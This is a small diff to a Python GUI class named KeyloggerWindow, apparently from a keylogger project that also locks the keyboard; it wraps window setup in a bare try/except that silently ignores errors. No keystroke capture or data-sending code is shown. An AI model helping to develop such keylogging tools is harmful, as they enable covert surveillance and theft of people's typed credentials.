@@ -84,10 +84,12 @@ class KeyloggerWindow(Frame):
 
 
     def loadKeyLog(self):
-        self.master.wm_title("Keylog and lock keyboard")
-        self.master.geometry('600x600')
-        self.master.mainloop()
-
+        try:
+            self.master.wm_title("Keylog and lock keyboard")
+            self.master.geometry('600x600')
+            self.master.mainloop()
+        except:
+            pass
     def manageEventHook(self):
         threading.Thread(target=self.eventHook).start()
     def eventHook(self):
